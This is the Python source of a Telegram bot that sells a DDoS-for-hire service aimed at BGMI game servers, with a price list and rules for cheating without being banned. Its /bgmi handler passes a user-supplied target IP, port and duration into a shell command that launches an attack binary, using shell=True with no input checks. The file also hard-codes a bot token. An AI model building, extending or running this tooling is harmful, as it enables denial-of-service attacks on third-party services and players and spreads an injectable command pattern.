import os
import time
import telebot
import subprocess
import datetime
import sqlite3
import logging
from concurrent.futures import ThreadPoolExecutor

# Initialize bot
bot = telebot.TeleBot('7313471299:AAEcOxRdR0jkZCe9-5rbZ9NUsxKPrOalTyo')

# Admin user IDs
admin_id = ["7469108296"]

# Global cooldown duration (in seconds)
GLOBAL_COOLDOWN = 300  # 5 minutes

# Max number of concurrent threads
MAX_THREADS = 10
thread_pool = ThreadPoolExecutor(max_workers=MAX_THREADS)

# Log file setup
LOG_FILE = "bot.log"
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# SQLite database setup
DB_FILE = "bot_users.db"

def init_db():
    """Initialize the database."""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id TEXT PRIMARY KEY,
            daily_attacks INTEGER DEFAULT 0,
            last_attack_date TEXT
        )
    """)
    conn.commit()
    conn.close()

def reset_daily_attack_count(user_id):
    """Reset daily attack count if the day has changed."""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    today = datetime.datetime.now().date().isoformat()
    
    cursor.execute("SELECT last_attack_date FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    
    if not row or row[0] != today:
        cursor.execute("""
            INSERT OR REPLACE INTO users (user_id, daily_attacks, last_attack_date)
            VALUES (?, 0, ?)
        """, (user_id, today))
    conn.commit()
    conn.close()

def increment_attack_count(user_id):
    """Increment the attack count for a user."""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        UPDATE users
        SET daily_attacks = daily_attacks + 1
        WHERE user_id = ?
    """, (user_id,))
    conn.commit()
    conn.close()

def get_daily_attacks(user_id):
    """Get the daily attack count for a user."""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT daily_attacks FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else 0

def log_command(user_id, command, target=None, port=None, time=None):
    """Log bot commands."""
    log_entry = f"UserID: {user_id} | Command: {command} | Target: {target} | Port: {port} | Time: {time}"
    logging.info(log_entry)

@bot.message_handler(commands=['bgmi'])
def handle_attack(message):
    """Handle /bgmi attack command."""
    global last_attack_time
    user_id = str(message.chat.id)
    
    # Reset daily attack count
    reset_daily_attack_count(user_id)
    
    # Parse command
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Use: /megoxer <target> <port> <time>")
        return
    
    target, port, time = command[1], command[2], command[3]
    try:
        port = int(port)
        time = int(time)
    except ValueError:
        bot.reply_to(message, "❗️ Port and time must be integers.")
        return
    
    if time > 120:
        bot.reply_to(message, "❗️ Time must not exceed 120 seconds.")
        return
    
    # Check daily attack limit
    daily_attacks = get_daily_attacks(user_id)
    if daily_attacks >= 3:
        bot.reply_to(message, "❕ You have reached the daily limit of 3 attacks.")
        return

    # Execute attack in a thread
    def attack():
        try:
            log_command(user_id, '/bgmi', target, port, time)
            bot.reply_to(message, f"🚀 Attack started successfully! 🚀\n\nTarget IP: {target}\nPort: {port}\nTime: {time} seconds.")
            
            # Simulate attack execution
            full_command = f"./RAGNAROK {target} {port} {time} CRACKS"
            subprocess.run(full_command, shell=True, check=True)
            
            # Increment the user's attack count
            increment_attack_count(user_id)
            remaining_attacks = 3 - get_daily_attacks(user_id)  # Calculate remaining attacks
            
            # Notify user about attack completion and remaining attacks
            bot.reply_to(message, f"Attack completed! ✅\n\n❕ Remaining attacks: {remaining_attacks}")
        except subprocess.CalledProcessError as e:
            logging.error(f"Attack failed: {e}")
            bot.reply_to(message, "❗️ Error: Attack execution failed.")
        except Exception as e:
            logging.error(f"Unexpected error: {e}")
            bot.reply_to(message, "❗️ An unexpected error occurred.")

    thread_pool.submit(attack)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"🔆 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗠𝗘𝗚𝗢𝗫𝗘𝗥 𝗣𝗨𝗕𝗟𝗜𝗖 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 🔆"
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    response = f"🔆 𝗠𝗘𝗚𝗢𝗫𝗘𝗥 𝗗𝗗𝗢𝗦 𝗥𝗨𝗟𝗘𝗦 🔆\n\n1. Do ddos in 3 match after play 2 match normal or play 2 tdm match\n2. Do less then 25 kills to avoid ban\n3. Dont Run Too Many Attacks !! Cause A Ban From Bot\n4. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot\n5. After 1 or 2 match clear cache of your game \n\n🟢 FOLLOW THIS RULES TO AVOID 1 MONTH BAN 🟢 \n\n [ THIS RULES ONLY FOR CLASSIC ,  YOU CAN BRUTAL IN BONUS CHALLENGE AND ULTIMATE ROYALE NO ISSUE]"
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    response = f"🔹 𝗠𝗘𝗚𝗢𝗫𝗘𝗥 𝗗𝗗𝗢𝗦 𝗣𝗥𝗜𝗖𝗘 𝗟𝗜𝗦𝗧 🔹\n\n𝖣𝖠𝖸 - 150/-𝖨𝖳\n𝖶𝖤𝖤𝖪 - 600/-𝖨𝖳\n𝖬𝖮𝖭𝖳𝖧 - 1200/-𝖨𝖳\n\nDM TO BUY @SYGDEVIL"
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def send_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "rb") as log_file:
                bot.send_document(message.chat.id, log_file)
        else:
            bot.reply_to(message, "❌ Log file not found.")
    else:
        bot.reply_to(message, "🚫 You don't have permission to access the logs.")

# Initialize the database
init_db()

# Auto-restart the bot if it stops
while True:
    try:
        bot.polling(none_stop=True, interval=3)
    except Exception as e:
        logging.error(f"Bot stopped unexpectedly: {e}")
        time.sleep(3)  # Wait for 3 seconds before restarting the bot